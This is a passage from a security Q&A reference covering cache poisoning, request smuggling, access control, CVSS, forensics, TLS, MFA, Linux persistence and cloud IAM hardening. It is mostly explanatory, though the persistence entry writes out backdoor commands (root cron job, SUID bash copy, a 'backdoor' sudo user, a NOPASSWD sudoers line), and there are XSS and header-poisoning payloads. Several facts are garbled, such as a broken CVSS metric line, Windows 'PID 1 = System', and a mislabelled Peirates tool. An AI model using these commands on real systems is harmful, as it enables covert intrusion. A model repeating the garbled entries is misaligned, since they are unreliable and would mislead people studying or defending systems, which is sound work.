Example: site reflects X-Forwarded-Host: header in response: Location: https://X-FORWARDED-HOST-VALUE/redirect; cache key only includes URL; attacker sends X-Forwarded-Host: attacker.com; response cached; all users get redirect to attacker.com (XSS, phishing). Techniques: (1) Unkeyed headers: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Forwarded-Port reflected but not in cache key. (2) Unkeyed query parameters: ?utm_campaign=value reflected in response but utm_ parameters excluded from cache key (fat GET parameters); inject ?utm_campaign=<script>alert(1)</script> -- cached and served to others. (3) HTTP request smuggling + cache poisoning: smuggle request that poisons cache with malicious response. (4) Response splitting (historical): inject CRLF into cached URL; add second response with malicious content. (5) Fat GET: send parameters in GET body (some frameworks process both); cache only considers URL (no body). Detection: Param Miner (Burp extension): discovers unkeyed headers and parameters; automated cache poisoning detection. Defences: normalise and validate headers before including in responses; include all input-influencing-output in cache key (Vary header); purge cache on security incidents; use CSP to limit XSS impact; Cloudflare and Akamai have built-in cache poisoning protections.
What is HTTP request smuggling?

HTTP request smuggling (HRS): attack exploiting discrepancy between how front-end and back-end servers parse HTTP request boundaries; attacker smuggles hidden request inside legitimate request body. Background: HTTP/1.1 has two headers for body length: Content-Length (CL): exact byte count; Transfer-Encoding: chunked (TE): chunked encoding with 0-length terminator. Conflict: if front-end uses CL and back-end uses TE (CL.TE vulnerability): front-end forwards based on CL; back-end reads chunked until 0 chunk; data after 0 chunk = start of next request from back-end perspective; attacker can prefix next legitimate user request with attacker-controlled data. Attack types: CL.TE: front-end uses Content-Length; back-end uses Transfer-Encoding. TE.CL: front-end uses Transfer-Encoding; back-end uses Content-Length. TE.TE: both use Transfer-Encoding but one can be confused with obfuscated TE header: Transfer-Encoding: xchunked or Transfer-Encoding[space]: chunked (obfuscated values). Impact: bypass front-end security controls (WAF sees legitimate request; back-end processes smuggled malicious request): access restricted URLs; bypass authentication; poison next user request (prepend to next user HTTP request; capture their credentials or session cookie); XSS via smuggling to force victim request through attacker-controlled prefix. Detection: HTTP Request Smuggler (Burp extension by James Kettle): automated detection; timing-based detection (CL.TE: back-end hangs waiting for complete chunk = time delay). Exploitation: send smuggled request; observe response timing and content differences; intercept victim requests by making back-end buffer part of victim request in attacker-controlled response. HTTP/2: introduced to eliminate request smuggling (binary framing with explicit length); but HTTP/2 downgrade to HTTP/1.1 at back-end reintroduces issue; H2.CL and H2.TE attacks exist. Mitigation: disable HTTP request reuse (pipeline) between front-end and back-end; ensure front-end and back-end agree on parsing; upgrade to HTTP/2 end-to-end; reject ambiguous requests (both CL and TE headers); normalise TE header handling.
What are access control models used in operating systems?

Access control models: DAC (Discretionary Access Control): resource owner decides who can access; standard Unix/Windows file permissions (owner sets rwx); flexible but relies on owner making good decisions; a compromised owner account grants attacker owner permissions; traditional Unix and Windows NTFS permissions use DAC. MAC (Mandatory Access Control): system enforces access based on labels/classifications; owner cannot override; Bell-LaPadula model: no read up (cannot read higher classification), no write down (cannot write to lower classification = prevents data leakage from high to low); used in military/government (classified/unclassified/secret/top secret); Linux SELinux and AppArmor are MAC implementations (though simpler than traditional MAC). RBAC (Role-Based Access Control): permissions assigned to roles; users assigned roles; user does not directly hold permissions; most common enterprise model; admin role has admin permissions; user role has user permissions; separation of duties (accounting role cannot approve own payments); AWS IAM, Azure RBAC, Active Directory groups all implement RBAC. ABAC (Attribute-Based Access Control): policy evaluated based on attributes: subject attributes (user.department = Finance, user.clearance = Secret); resource attributes (document.classification = Confidential, document.owner = HR); environmental attributes (time of day, IP location, device compliance); very fine-grained; XACML (eXtensible Access Control Markup Language) standard; more complex to implement than RBAC; AWS IAM conditions implement subset of ABAC. ReBAC (Relationship-Based Access Control): permissions based on relationship between user and resource; Google Zanzibar (paper 2019) implements ReBAC for Google Drive and Docs; user has access to document if they own it or if they are member of group that has access; natural for hierarchical access (folder access grants file access); OpenFGA (open-source Zanzibar implementation), SpiceDB, Warrant. Zero Trust applies attribute-based policy to network access in addition to data access.
What is identity governance and administration (IGA)?

IGA (Identity Governance and Administration): framework and processes for managing digital identities and their access rights throughout lifecycle; ensures right people have right access to right resources at right time. Components: IGA platform: centralised visibility of all identities (employees, contractors, service accounts) and their access across all systems; SailPoint, Saviynt, One Identity Manager, Microsoft Identity Governance. Access lifecycle management: Joiner: when employee joins, provision access based on role (HR triggers; manager approves; automatic provisioning to AD, Salesforce, Jira, GitHub, etc.); Mover: when employee changes role or department, remove inappropriate access (access creep prevention), grant new role access; Leaver: when employee leaves, deprovision all access immediately (offboarding automation critical; compromised ex-employee accounts common attack vector). Access certification (recertification): periodic review of who has access to what; manager certifies each of their reports access is still needed; certify privileged accounts quarterly; certify standard accounts semi-annually or annually; remove uncertified access; compliance requirement (SOX, PCI DSS, HIPAA). SoD (Separation of Duties): prevent single individual from having conflicting permissions (accounts payable and accounts receivable; code developer and code approver); SoD rules defined in IGA; conflicts flagged and either prevented or require compensating control; SOX compliance requirement. Role management: role mining (discover what access patterns exist; create roles from actual access); role engineering (design roles from business process perspective); role explosion problem (too many granular roles become unmaintainable). Privileged access governance: track privileged account holders; certify privileged access more frequently; integrate with PAM (Privileged Access Management -- CyberArk, BeyondTrust); just-in-time access (access granted for limited time, then revoked). Analytics: access risk scoring; anomaly detection (user access pattern differs from peers); orphan accounts (accounts with no owner); dormant accounts (no login in 90 days).
What is the CVSS 3.1 scoring system in detail?

CVSS 3.1 (Common Vulnerability Scoring System version 3.1): industry standard for rating vulnerability severity; base score 0-10; three metric groups. Base Score Metrics (mandatory): Attack Vector (AV): Network (N) score 0.85 -- exploitable remotely over internet; Adjacent (A) 0.62 -- same network segment (LAN, Bluetooth); Local (L) 0.55 -- attacker needs local account or physical access; Physical (P) 0.2 -- requires physical access to device. Attack Complexity (AC): Low (L) 0.77 -- attack reproducible reliably; High (H) 0.44 -- specific conditions, race condition, or information gathering needed before exploit. Privileges Required (PR): None (N) 0.85 -- no auth needed; Low (L) 0.62 -- regular user; High (H) 0.5 -- admin. Scope Unchanged: Low (L) 0.68 -- admin. User Interaction (UI): None (N) 0.85 -- no user action; Required (R) 0.62 -- victim must click, open file, etc. Scope (S): Changed (C) -- impact extends beyond vulnerable component; Unchanged (U) -- contained to vulnerable component. Confidentiality/Integrity/Availability Impact: None (N) 0; Low (L) 0.22; High (H) 0.56. Score calculation: ISS = 1 - (1-Conf) * (1-Integ) * (1-Avail); Scope Unchanged: Impact = 6.42 * ISS; Scope Changed: Impact = 7.52 * (ISS - 0.029) - 3.25 * (ISS - 0.02)^15; Exploitability = 8.22 * AV * AC * PR * UI; Base score = Roundup(min((Impact+Exploitability),10)) if Impact > 0 else 0. Temporal metrics (optional): Exploit Code Maturity (E): unproven, proof-of-concept, functional, high; Remediation Level (RL): official-fix, temporary-fix, workaround, unavailable; Report Confidence (RC): unknown, reasonable, confirmed; multiply base by factors < 1.0 to reduce temporal score when no PoC exists or official patch available. Environmental metrics: modify base metrics for organisation context; Confidentiality/Integrity/Availability Requirement: Low/Medium/High based on asset importance to organisation; highly confidential data = CR:High increases effective confidentiality score impact. CVSS 4.0 (2023): CVSS v4 adds attack requirements metric and supplemental metrics; finer granularity; not yet widely adopted.
How does memory forensics work?

Memory forensics: analysis of volatile computer memory (RAM) to extract forensic artefacts; critical for investigating fileless malware, process injection, and encryption keys. Why memory: fileless malware exists only in RAM (no disk artefacts); encryption keys reside in memory; running processes, network connections captured at point in time; decrypt encrypted evidence (VeraCrypt volumes mounted = master key in memory). Acquisition: full physical memory dump without rebooting system; Windows: WinPmem (open source): winpmem -o memory.raw; FTK Imager (Live Acquisition): create memory dump; Dumpit (single executable): magnet tool; LiME (Linux Memory Extractor): kernel module: insmod lime.ko path=/mnt/usb/memory.lime format=lime; Hibernation file (hiberfil.sys): compressed memory dump from Windows hibernate; Crash dump (%SystemRoot%\MEMORY.DMP): partial or full memory dump from Blue Screen. Analysis with Volatility (3): volatility3 -f memory.raw windows.pslist (list processes; look for suspicious names or parent-child anomalies); windows.cmdline (command lines for each process; malware command line); windows.dlllist -p PID (DLLs loaded in process); windows.netscan (network connections from memory; find C2); windows.malfind (find injected code: pages with execute permission that are not backed by file; suspicious memory sections); windows.handles -p PID (open handles: files, registry keys, mutex -- mutex often unique per malware family). Artefacts: credentials: mimikatz sekurlsa::logonpasswords reads same LSASS memory; volatility windows.lsadump or mimikatz on memory dump extracts NTLM hashes, Kerberos tickets; encryption keys: AES keys, VeraCrypt master keys, BitLocker VMK; for VeraCrypt: open vmk finder or bsodv; Kerberos tickets (pass-the-ticket); clipboard contents; browser history and passwords (Chrome stores in memory before writing to disk); deleted registry keys still in memory if not evicted. Yara scanning memory: volatility windows.yarascan -y malware.yar (scan all process memory for YARA rules; detect malware even if never written to disk).
What is a public key certificate and how does TLS use it?

X.509 public key certificate: digitally signed document binding public key to identity; issued by Certificate Authority (CA); used in TLS, S/MIME, code signing. Certificate fields: Version (v3); Serial Number (unique per CA); Signature Algorithm (sha256WithRSAEncryption; sha384WithECDSA); Issuer (CA name: CN=DigiCert Global Root CA, O=DigiCert Inc, C=US); Validity (Not Before, Not After dates); Subject (entity identified: CN=www.example.com, O=Example Corp); Subject Public Key Info (RSA/EC public key); Extensions: Subject Alternative Names (SANs: additional domains/IPs; modern certificates use SAN not Subject CN for domain names); Basic Constraints (CA:TRUE = CA certificate, CA:FALSE = leaf); Key Usage (Digital Signature, Key Encipherment); Extended Key Usage (serverAuth, clientAuth, codeSigning, emailProtection). TLS 1.3 handshake: (1) Client Hello: supported cipher suites (TLS_AES_256_GCM_SHA384); TLS version 1.3; client random; key_share (ECDH public key for key exchange). (2) Server Hello: chosen cipher suite; server random; key_share (server ECDH public key); Certificate (server certificate chain); CertificateVerify (signature over handshake with server private key -- proves possession of private key); Finished (HMAC of handshake messages). (3) Client validates: certificate signature by CA (verify certificate chain); certificate not expired; certificate not revoked (OCSP); CN/SAN matches hostname (FQDN match); CertificateVerify signature valid (server has private key matching certificate public key); derives session keys from ECDH (Elliptic Curve Diffie-Hellman: key exchange without transmitting key); Finished (client Finished MAC). All subsequent data encrypted with session keys (AES-GCM or ChaCha20-Poly1305 AEAD). Perfect Forward Secrecy: TLS 1.3 mandates ephemeral ECDH key exchange; session key not derived from long-term private key; past sessions safe even if private key later compromised; TLS 1.2 allowed non-PFS RSA key exchange (deprecated).
What is certificate transparency and why does it matter for security?

Certificate Transparency (CT): RFC 6962 standard requiring all publicly-trusted TLS certificates to be logged in publicly auditable CT logs before browsers will accept them. Why needed: CA compromises (DigiNotar 2011: Iranian government used compromised Dutch CA to issue fake Google certificate; SSL interception of Iranian users); rogue certificates issued by mis-operating CAs; fraudulent certificate issuance targeting banks, governments; without CT: certificate issuance invisible to domain owner. How CT works: CA submits precertificate to CT logs before issuing; CT log returns Signed Certificate Timestamp (SCT); SCT embedded in final certificate; browsers check SCT presence and validity; SCT proves certificate logged before issuance. CT log properties: append-only Merkle tree; cannot delete or modify logged certificates; log operators: Google, Cloudflare, DigiCert, Sectigo; IETF RFC 9162 (updated CT v2). Monitoring: domain owners monitor CT logs for certificates issued for their domains; new certificate issuance alert = detect unauthorized certificate; crt.sh (search CT logs: crt.sh/?q=example.com -- shows all certificates ever issued for domain and subdomains); Cert Spotter (SSLMate: monitor CT logs for your domain); Certificate Search API. Security uses: attack reconnaissance: crt.sh reveals all subdomains ever issued certificates = subdomain enumeration without DNS brute force; discover forgotten development or staging servers; attackers also monitor for high-value targets (Google, Apple, banks) certificate issuance as attack timing signal; phishing detection: monitor for certificates issued for typosquat domains (paypa1.com, googl3.com -- CT logs reveal phishing infrastructure being stood up before attack launches). CAA (Certification Authority Authorisation) DNS record: specifies which CAs allowed to issue for domain; mitigates rogue CA issuance; example: example.com. CAA 0 issue digicert.com; blocks all other CAs from issuing even if compromised; not CT but complementary control.
What is multi-factor authentication and what are the types?

MFA (Multi-Factor Authentication): authentication using two or more factors from different categories: something you know (password, PIN), something you have (hardware token, phone, smart card), something you are (fingerprint, face, iris). Knowledge factors: password; PIN; security questions (weak -- guessable, phishable, breach-exposed; avoid for critical accounts); passphrase. Possession factors: TOTP (Time-based One-Time Password, RFC 6238): shared secret generates 6-digit code every 30 seconds; Google Authenticator, Authy, Microsoft Authenticator; symmetric secret stored both server and device = phishable (code valid 30s -- attacker relays real-time); HOTP (HMAC-based OTP): counter-based; increments per use; YubiKey OTP mode. SMS OTP: OTP delivered via SMS; vulnerable to SIM swap; SS7 interception; phone number porting; US government deprecated SMS OTP recommendation; avoid for high-security accounts; phishable. Push notifications: auth app sends push to phone; tap approve; Duo Security; Microsoft Authenticator; can be abused (MFA fatigue attack: flood target with push notifications until they accidentally approve; Uber breach 2022 via MFA fatigue). Hardware security keys (FIDO2/WebAuthn): YubiKey, Google Titan Key; public-key cryptography; phishing-resistant (authentication bound to website origin; attacker.com cannot use legitimate credentials from bank.com); no shared secret to steal; strongest MFA; US government mandates FIDO2 for federal systems. Biometrics: fingerprint; face ID; iris scan; voice; inherence factor; not replaceable if compromised; typically used for local device unlock (Face ID unlocks iPhone) rather than server-side auth; server-side biometrics raise privacy concerns. Phishing-resistant MFA: FIDO2 hardware keys and passkeys are phishing-resistant; TOTP, SMS, push MFA are NOT phishing-resistant (can be relayed); CISA recommends phishing-resistant MFA for critical systems. MFA fatigue: send many push notifications rapidly (account access attempt); some users approve to stop notifications; mitigate with number matching (user enters number shown in push app) or additional context in push.
What are common techniques for persistent access in Linux?

Linux persistence techniques: Cron jobs: add malicious cron entry: echo */5 * * * * root /tmp/.backdoor >> /etc/crontab; or user crontab: crontab -e; /var/spool/cron/ or /etc/cron.d/; systemctl list-timers (shows systemd timers -- newer equivalent). SSH authorized_keys: add attacker public key to ~/.ssh/authorized_keys for target user (or /root/.ssh/authorized_keys for root); SSH key auth; survives password changes; detect: diff authorized_keys against expected baseline. Init/service persistence: systemd service: create /etc/systemd/system/backdoor.service; [Service] ExecStart=/tmp/.bd; [Install] WantedBy=multi-user.target; systemctl enable backdoor; SysVinit: add script to /etc/init.d/ and link in /etc/rc*.d/. SUID binaries: copy /bin/bash to /tmp/.bash; chmod 4755 /tmp/.bash; /tmp/.bash -p gives root shell; or modify existing SUID binary. Library injection (LD_PRELOAD): attacker-controlled shared library loaded before others; intercept library calls; /etc/ld.so.preload or LD_PRELOAD env for specific processes; modifies behaviour of other programs transparently. PAM (Pluggable Authentication Modules): compile malicious PAM module; add to /etc/pam.d/sshd; intercepts authentication; logs all passwords; backdoor any password. SSH ForceCommand override: add Match User to sshd_config pointing to attacker script. Bash profile: /etc/bash.bashrc, ~/.bashrc, ~/.profile, ~/.bash_profile; commands executed on shell login; malicious commands added. Kernel module (rootkit): loadable kernel module hides processes, files, network connections; requires root to load; very hard to detect without offline analysis; blacklisting module after loading insufficient. User accounts: add new user or add existing user to sudoers or wheel group; useradd -m -G sudo backdoor; set password; or add backdoor ALL=(ALL) NOPASSWD:ALL to /etc/sudoers; Peirates (cloud-native tool) checks for all these Linux persistence mechanisms.
How do you detect and investigate suspicious processes in Windows?

Windows process analysis: identifying malicious or suspicious processes. Built-in tools: tasklist /v (verbose process list with user and image path); tasklist /svc (services hosted in processes -- useful for spotting unusual services in svchost.exe); wmic process get processid,parentprocessid,name,commandline (command lines including arguments -- critical for detection); sc query (service status); net start (running services). Sysinternals suite: Process Explorer: hierarchical view; colour coding (blue=protected; pink=packed/suspicious); shows loaded DLLs, handles, network connections per process; compare signature: right-click > Properties > Image > Verify (is binary signed?); strings in memory; Process Monitor: real-time file, registry, network, process activity; filter by process name; Operation=WriteFile to spot file dropper activity; TCPView: real-time network connections per process; Autoruns: comprehensive persistence location inventory (Run keys, services, scheduled tasks, drivers, LSA providers, browser extensions, WMI subscriptions) -- all with signature verification. Suspicious indicators: Process masquerading: svchost.exe running outside C:\Windows\System32\; explorer.exe with command-line arguments (legitimate explorer.exe has no arguments); Unexpected parent: cmd.exe or powershell.exe child of winword.exe or excel.exe (document macro execution); Java spawning cmd.exe (potential web app exploitation). No disk image: process with memory region not backed by file (reflective injection -- hollow process, module stomping); Process Explorer highlights in different colour. Unsigned or invalidly signed: legitimate Windows processes are signed; unsigned process in System32 = suspicious. High entropy: process with many connections to different external IPs; high CPU. Memory anomalies: MZ header (PE header) in unexpected memory regions; Malfind (Volatility) or Get-InjectedThread (PowerShell) detect. PID history: PID 1 = System; PID 4 = System (Windows); unusual PIDs for system processes; very low PIDs for non-system processes suspicious. Network connections: ProcessMonitor filter Operation=TCP Connect; correlate process with external connection; check IP reputation via VirusTotal.
What is a security architecture review?

Security architecture review: systematic examination of system design for security weaknesses before or after implementation. Goals: identify security gaps at design level (cheaper than post-implementation); validate security controls are appropriate for risk; ensure consistency with security principles; compliance alignment; produce actionable recommendations. When to perform: new system design; major feature addition; acquisition due diligence; periodic review of critical systems; regulatory requirement (SOC 2, ISO 27001). What to review: architecture diagrams: data flow diagrams (where data goes, what security controls at each transition); network diagrams (segmentation, trust zones, Internet exposure); component diagrams (what talks to what). Trust boundaries: where data crosses from trusted to untrusted (or less trusted) domain; what authentication and authorisation at each boundary; what encryption at each boundary; what logging at each boundary. Authentication and authorisation design: SSO integration; MFA enforcement; role model; session management; token lifecycle; privilege separation. Cryptography: which algorithms used (AES-256, RSA-2048, SHA-256 minimum); where encryption applied (in transit, at rest); key management (where stored, how rotated, who has access). Data flows: where is sensitive data? Who can access it? How is it protected at rest and in transit? Data retention and deletion? Third-party data sharing? Logging and monitoring: what events logged? Where logs stored? How long retained? Alerting? Incident response integration? Third-party and supply chain: third-party libraries and services? API security? Vendor access? Data shared with third parties? Outputs: threat model (STRIDE or ATT&CK based); risk rating for identified gaps; prioritised recommendations; security requirements traceability matrix (each control requirement mapped to implementation). Tools: OWASP Threat Dragon for diagramming; draw.io; Microsoft Threat Modeling Tool; documentation review; interviews with architects and developers.
How do you assess and harden cloud IAM configurations?

Cloud IAM hardening: Identity and Access Management is primary security control in cloud; misconfigured IAM = most common cloud breach root cause. AWS IAM assessment: enumerate all IAM entities: aws iam list-users; aws iam list-roles; aws iam list-groups; aws iam list-policies --scope Local (customer-managed); collect all permissions: aws iam get-policy-version; aws iam get-role-policy; aws iam list-attached-role-policies; Identify overly permissive: AdministratorAccess attached to service roles; iam:PassRole (escalation path); iam:CreatePolicyVersion (can add admin version); iam:AttachUserPolicy (grant self admin policy). Tool: IAM Access Analyzer (AWS built-in): finds externally accessible resources; PACU (AWS exploitation framework: has privilege escalation enumeration module). ScoutSuite (NCC Group: multi-cloud security auditing tool; generates HTML report of IAM findings, exposed resources, logging gaps). Prowler: AWS security best practice assessments; CIS AWS Foundations Benchmark; generates findings per control. Key IAM hardening actions: Remove unused users, roles, access keys (aws iam get-credential-report); Delete access keys older than 90 days; Enable MFA for all IAM users (aws iam list-mfa-devices to check); Attach permissions via groups not directly to users; Use IAM roles for EC2 instances (no long-lived access keys in code or config files); Service Control Policies (SCPs) in AWS Organisations: deny actions at org level regardless of IAM; SCP: deny s3:GetObject on s3:* unless RequestedRegion = us-east-1 (prevent data exfiltration to other regions); Permission Boundaries: limit maximum permissions a role can have even if admin tries to grant more; AWS config rules: iam-root-access-key-check; iam-user-mfa-enabled; iam-no-inline-policy; iam-policy-no-statements-with-admin-access; Principle of least privilege: use Access Advisor in IAM console to see which permissions actually used; remove unused services from policies.
What is OSCP and how do you prepare for it?

OSCP (Offensive Security Certified Professional): hands-on penetration testing certification from Offensive Security; requires 24-hour practical exam (hack into multiple machines and document findings); considered gold standard for entry/mid-level pentesters. Prerequisites: solid Linux command line; basic networking (TCP/IP, routing, firewalls); basic scripting (Bash, Python); understanding of common vulnerabilities. Course: PEN-200 (PWK -- Penetration Testing with Kali Linux); includes access to practice lab (Offsec Proving Grounds); updated regularly; covers: information gathering, vulnerability scanning, web attacks, buffer overflows (x86 Windows), client-side attacks, tunneling, AD attacks, post-exploitation. Exam format: 23 hours 45 minutes of hacking + 24 hours report writing; total 100 points available; need 70 to pass; three standalone machines (10/20/25 points each) + AD set (40 points); AD set: compromise entire chain to get all 40 points or 0; can use Metasploit once during exam. Preparation strategy: Complete all PEN-200 exercises and all lab machines; Hack The Box (retired OSCP-style machines: TJNull list); Proving Grounds Practice (from Offsec); VulnHub machines (offline VMs); TryHackMe learning paths for specific weaknesses; focus areas: enumeration (thorough; do not miss services), manual exploitation (without Metasploit), Active Directory attacks, report writing (practice with every machine); Time management: never spend more than 1-2 hours stuck on single machine; move on and return with fresh eyes; make sure to take notes on every step (cannot remember everything in report writing phase). Report: professional penetration test report format; each finding: description, risk rating, proof (screenshot of proof.txt or hostname+ipconfig), reproduction steps; Offensive Security provides report template. Common pitfalls: not doing enough enumeration; relying too much on automated tools; not practicing report writing; underestimating AD section weight (40 points = pass or fail).
What is the difference between IDS and IPS?

IDS (Intrusion Detection System) vs IPS (Intrusion Prevention System): IDS: passive monitoring device; detects threats; generates alerts; does NOT block traffic; deployed out-of-band (network tap or SPAN port -- copy of traffic); cannot affect traffic flow; adds no latency to production traffic; lower risk (failed IDS device does not break network); analyst reviews alerts and manually responds. IPS: active inline device; detects AND blocks threats; deployed inline (all traffic passes through); can drop packets matching attack signatures; adds latency (though modern IPS: sub-millisecond); if IPS fails or becomes unavailable: failopen (traffic bypasses -- availability preserved) or failclose (traffic blocked -- security preserved, availability lost); requires careful tuning (false positives block legitimate traffic). Deployment comparison: IDS: good for detection and threat intelligence; safe first deployment; analyst triages alerts. IPS: good for automated prevention; reduces analyst burden; requires confident tuning to avoid blocking legitimate traffic. Modern unified: Suricata and Snort can operate in both IDS and IPS mode; IDS mode: read from tap/SPAN; IPS mode: use NFQUEUE (Linux Netfilter) or DPDK to process and optionally drop inline traffic. NGFW (Next-Generation Firewall): combines IPS with stateful firewall, application identification, URL filtering, TLS inspection; most enterprises deploy NGFW rather than standalone IPS; Palo Alto, Fortinet, Check Point, Cisco Firepower. Cloud equivalents: AWS Network Firewall (IPS); Azure Firewall Premium (IDPS); cloud-native solutions for cloud traffic inspection. Tuning importance: both IDS and IPS require regular tuning; vendor default rulesets have false positives; tune by: disabling irrelevant rule categories (no Windows rules if Linux-only environment); adding exceptions for known-good traffic (vulnerability scanner IPs, monitoring tools); adjusting thresholds; track false positive rate weekly and tune until below 5%.
What is software composition analysis (SCA)?

SCA (Software Composition Analysis): automated process of identifying open-source components and dependencies in application code; detects known vulnerabilities in those components. Why needed: modern applications contain 70-90% open-source code; Log4Shell (CVE-2021-44228) example: one vulnerable dependency in 18,000 organisations; without SCA, teams did not know they used Log4j. How it works: scan project dependencies (package.json, pom.xml, requirements.txt, Gemfile.lock, go.sum, etc.); generate list of all direct and transitive dependencies with versions; compare against vulnerability databases (NVD, OSS Index, GitHub Advisory Database); report vulnerable dependencies with CVE, severity, and remediation (version with fix). SBOM (Software Bill of Materials): output of SCA; complete inventory of all software components; formats: CycloneDX (OWASP standard, JSON/XML), SPDX (Linux Foundation, text/JSON/RDF); US Executive Order 14028 (2021) mandates SBOM for software sold to US government; enables rapid response when new vulnerability announced (immediately know if affected). Tools: Snyk (most popular; developer-friendly; GitHub/GitLab integration; auto-fix PRs; supports 20+ package managers; container scanning; IaC scanning); Dependabot (GitHub native; free; auto-PRs for vulnerable dependencies; simpler than Snyk); OWASP Dependency-Check (free; command-line; XML/HTML report; can integrate into Jenkins/Maven/Gradle); Black Duck (commercial; comprehensive; enterprise features; accurate; expensive); Trivy (fast; open-source; supports containers, filesystems, repos; Aqua Security). CI/CD integration: SCA runs on every pull request; block merge if Critical or High unfixed vulnerabilities introduced; separate policy for transitive vulnerabilities (harder to fix immediately); track vulnerability debt over time; automated remediation: Snyk Fix PRs, Dependabot PRs automatically upgrade vulnerable dependencies. License compliance: SCA also identifies open-source licenses; GPL copyleft license in proprietary software = legal risk; commercial SCA tools flag license conflicts.
What is application security testing (SAST vs DAST vs IAST)?

Three categories of application security testing automated tools: SAST (Static Application Security Testing): analyses source code or compiled code without executing it; finds vulnerabilities at code level; runs during development or CI/CD pipeline; catches issues early (shift-left); examples: Semgrep, CodeQL, Checkmarx, Veracode Static, SonarQube; strengths: full code coverage; finds issues early; language-specific; no runtime needed; weaknesses: high false positive rate (10-40%); cannot find runtime issues (authentication failures, access control); language-specific (different tool per language); slow on large codebases. DAST (Dynamic Application Security Testing): tests running application from outside via HTTP requests; black-box; sends attack payloads; observes responses; mimics attacker; examples: OWASP ZAP, Burp Suite, Nuclei, HCL AppScan DAST; strengths: low false positive rate (traffic-based); finds runtime issues (auth failures, session management, server-side logic); language-agnostic; weaknesses: requires running application (later in SDLC); limited coverage (cannot reach code not triggered by test scenarios); misses code-level issues (crypto implementation). IAST (Interactive Application Security Testing): agent-based; instrument running application during testing; observes code execution paths from inside; triggered by existing test suite or DAST scan; examples: Contrast Security, Seeker, Hdiv; strengths: very low false positive rate (knows exactly which code executed); finds complex taint-flow issues (user input reaching dangerous sink through many hops); covers runtime AND code perspective; weaknesses: requires agent in application (deployment complexity); language-specific agents; performance overhead during testing; newer technology, fewer options. SCA (Software Composition Analysis): separate category for third-party/open-source dependency vulnerabilities (see SCA entry). Best practice: all four in combination; SAST in IDE and CI/CD (instant developer feedback); SCA in CI/CD (block vulnerable dependencies); DAST in test environment pipeline (catch runtime issues); IAST during QA testing (deep taint analysis); manual penetration testing for complex business logic and chained vulnerabilities tools miss.
What is a tabletop exercise in cybersecurity?

Tabletop exercise (TTX): facilitated discussion-based exercise where team works through simulated incident scenario; tests people and process without actual technical simulation; identifies gaps in incident response plan before real incident. Types: Discussion-based: team sits around table; facilitator presents scenario; participants discuss how they would respond; no actual system actions; tests communication, decision-making, plan knowledge. Operations-based (drill): actually execute response procedures in controlled environment; activate incident response team; test communication trees; may include partial technical simulation. Functional exercise: full activation of incident response team; realistic scenario requiring actual decisions and potentially technical actions; more intensive; multi-day. Full-scale: most comprehensive; all stakeholders; public communication; law enforcement involvement; rare; typically for critical infrastructure. Process: define objectives (what gaps do we want to expose?); choose scenario (ransomware, data breach, DDoS, insider threat, supply chain compromise); invite participants (IR team, legal, HR, PR, executive, IT leadership, business owners); inject cards: facilitator presents scenario situations as discussion unfolds; participants respond to each inject; document gaps and lessons learned; after-action report with remediation actions. Common scenarios: ransomware attack spreading through network (how do we detect? When do we isolate? Do we pay? Who decides? How do we communicate to customers?); data breach notification (GDPR 72-hour deadline -- what is our process?); insider threat (employee stealing data before resignation); supply chain compromise (vendor software update contains malware); executive account phishing and BEC fraud; nation-state APT targeting critical IP; cloud outage causing service unavailability. Benefits: inexpensive vs operational exercises; executive engagement; reveals missing playbooks; tests communication channels (is out-of-band communication ready when email/Slack compromised?); NIST IR requirement; insurance requirements; compliance (FFIEC, NERC CIP require exercises); improve muscle memory for real incidents.
What is a bug bounty program and how does it work?

Bug bounty program: organisation invites security researchers to find and report vulnerabilities in exchange for monetary reward; managed vulnerability disclosure channel; security testing by crowd. Program types: Private (invite-only): small curated group of researchers; lower volume; researchers vetted by platform; less noise. Public: open to any researcher on platform; higher volume; more coverage; more noise (invalid reports, duplicates). Platforms: HackerOne (largest; 3000+ programs; Uber, Twitter, GitHub, DoD); Bugcrowd (large; 1200+ programs; Tesla, Mastercard, NCSC UK); Intigriti (European-focused; GDPR-friendly; Air France, Telenet); Synack (vetted network of researchers; enterprise focus; government clients). Bounty structure: critical: $5,000-$1,000,000+ (Apple iOS RCE); high: $1,000-$50,000; medium: $500-$5,000; low: $100-$1,000; informational/out-of-scope: $0-$100 or swag (t-shirts); CVSS-based triage; business impact modifies reward; P1-P4 priority levels. Researcher responsibilities: report findings through platform (not directly or publicly); provide detailed reproduction steps; do not access/modify/exfiltrate user data beyond proof of concept; do not deny service; report only one vulnerability per report; allow time for remediation before public disclosure. Organisation responsibilities: respond within defined SLA (typically 24-72h initial response; 30-90 day remediation SLA); pay bounty promptly; update duplicate status honestly; do not use legal threats against good-faith researchers (Safe Harbour policy); communicate status of vulnerabilities. Economics: average program cost: $500K-$2M per year (varies enormously); cost-effective vs full-time team (only pay for results); community of 1M+ researchers on HackerOne providing continuous testing coverage.
What is cloud workload protection platform (CWPP)?

CWPP (Cloud Workload Protection Platform): security solution for protecting workloads (VMs, containers, serverless) running in cloud; focuses on runtime protection rather than just configuration. Core capabilities: vulnerability management: continuous scanning of running workloads for OS and application vulnerabilities; runtime protection: detect and prevent attacks while workloads execute; process monitoring, network monitoring, file integrity monitoring; compliance: CIS benchmark assessments; PCI DSS, HIPAA, SOC 2 control checks; drift prevention: detect changes from known-good baseline (new process, new network connection, new file); threat detection: ML-based anomaly detection; known malware signatures in memory. Leading products: Palo Alto Prisma Cloud (comprehensive: CSPM + CWPP + CIEM + container security + serverless); CrowdStrike Falcon Cloud Workload Protection (extends endpoint EDR to cloud VMs and containers); Aqua Security (container-native; comprehensive container lifecycle security); Sysdig (eBPF-based; Kubernetes-native; Falco open-source engine); Microsoft Defender for Cloud (Azure-native; extends to multi-cloud; Defender for Servers = CWPP). Container-specific: image scanning (before deployment); registry scanning; runtime threat detection; network policy enforcement; RBAC validation; Kubernetes-native policies. Serverless protection: Lambda/Azure Functions security; function-level access policies; input validation; dependency scanning. eBPF (Extended Berkeley Packet Filter): modern approach to CWPP instrumentation; kernel-level visibility without kernel module (safer, more performant); low overhead; Falco, Sysdig, Aqua use eBPF. CWPP vs CSPM: CSPM (Cloud Security Posture Management): configuration assessment (is S3 bucket public? Is MFA enabled? Is logging enabled?); CWPP: runtime workload protection (is this process doing something malicious?); complementary; often same platform (Prisma Cloud, Defender for Cloud cover both).
What is CSPM (Cloud Security Posture Management)?

